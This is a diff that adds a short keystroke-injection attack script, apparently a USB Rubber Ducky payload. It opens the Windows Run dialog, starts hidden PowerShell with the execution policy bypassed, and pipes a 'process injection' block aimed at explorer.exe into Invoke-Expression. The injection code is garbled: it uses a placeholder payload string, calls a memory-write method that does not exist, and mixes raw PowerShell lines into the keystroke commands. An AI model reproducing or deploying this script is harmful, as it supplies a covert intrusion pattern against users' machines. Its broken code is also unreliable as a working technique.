@@ -1,0 +1,17 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Process injection
+$string = @"
+`$process = Get-Process explorer
+`$bytes = [System.Text.Encoding]::UTF8.GetBytes("malicious_code_here")
+`$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
+`[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
+`$process.MainModule.WriteMemory($ptr, $bytes, $bytes.Length)
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
